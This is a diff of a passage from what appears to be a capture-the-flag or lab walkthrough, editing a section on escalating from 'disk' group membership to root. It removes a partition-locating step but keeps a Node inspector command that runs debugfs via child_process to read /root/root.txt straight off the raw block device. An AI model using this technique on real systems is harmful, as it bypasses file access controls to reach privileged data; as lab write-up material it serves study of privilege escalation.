@@ -169,14 +169,8 @@ cat /tmp/pipe.txt
 
 ## disk group → root
 
-`disk` group membership is read/write on the raw block devices, which is effectively root regardless of file permissions — I can read root's files straight off the underlying filesystem. Locate the root partition:
+`disk` group membership is read/write on the raw block devices, which is effectively root regardless of file permissions — I can read root's files straight off the underlying filesystem. 
 
-```bash
-lsblk
-# nvme0n1p1 259:2  0  20G  0 part /
-```
-
-Then use `debugfs` to pull `/root/root.txt` directly off the block device, bypassing the filesystem's access control entirely. I ran it from the same inspector session, so it executes as `pipelinesvc`:
 
 ```
 debug> exec process.mainModule.require('child_process').execSync('debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 > /tmp/rf.txt 2>/dev/null || true').toString()
